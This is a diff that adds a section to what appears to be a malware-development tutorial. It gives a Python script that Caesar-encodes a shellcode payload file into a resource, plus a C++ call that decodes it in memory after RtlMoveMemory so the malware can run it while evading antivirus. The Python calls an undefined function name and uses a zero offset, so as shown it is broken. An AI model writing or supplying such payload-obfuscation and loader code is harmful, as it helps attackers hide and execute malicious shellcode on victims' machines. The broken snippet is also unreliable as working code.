@@ -588,3 +588,64 @@ do this quite easily with pointers, fortunately.
 When you work with binary data in Python3 there's too much fucking
 error checking for you to work with it without binascii so be ready
 to use that library.
+
+The goal of this section is to encode the resource file and implement
+functionality to decrypt the data after it is loaded to a buffer.
+
+```Python
+import sys
+import io
+import binascii
+
+offset = 0
+
+def ccbin(shellfile):
+    counter = 1
+    byte = ''
+    enc_shell = ''
+    s1 = binascii.b2a_hex(shellfile) # convert bin to hex
+    s2 = s1.decode() # make it usable for editing
+    for i in s2:
+        if(counter % 2 == 0):
+            byte = byte + i
+            byte = int(byte,16)
+            byte = int(byte + offset)
+            byte = int(byte % 256)
+            byte = hex(byte)[2:]
+            if(len(byte) == 1):
+                byte = '0' + byte
+            enc_shell = enc_shell + byte
+            byte = ''
+        else:
+            byte = byte + i
+        counter += 1
+    s3 = enc_shell.encode() # make encoded shellcode ascii
+    s4 = binascii.a2b_hex(s3)
+    return s4
+
+def main():
+    try:
+        shellfile = open(sys.argv[1], 'rb').read() # 'rb' = read bytes
+    except:
+        print("file arg needed %s <payload>" %sys.argv[0])
+    print("Original shellfile data ", shellfile[:20])
+    enc_text = cc(shellfile)
+    print("Encoded shellfile data ", binascii.hexlify(enc_text[:10]))
+    open("BuyMyMixTape.enc", "wb").write(enc_text)
+
+main()
+```
+
+This function will take the provided input file and output the encoded
+output as `BuyMyMixTape.enc`. To use this data, import it as a new
+resource file. The problem exists now in that the data is encoded,
+and we can only decode it once the data is moved into our character
+pointer in the malware. This would be on the line where we call
+`MVM`. Immediately after calling `RtlMoveMemory`, we have to implement
+the decryption:
+
+```c++
+Caesar((char*)execute, notbuf_len, 1); // 3rd arg is the offset
+```
+
+And that's basically it. Windows Defender will still catch this.
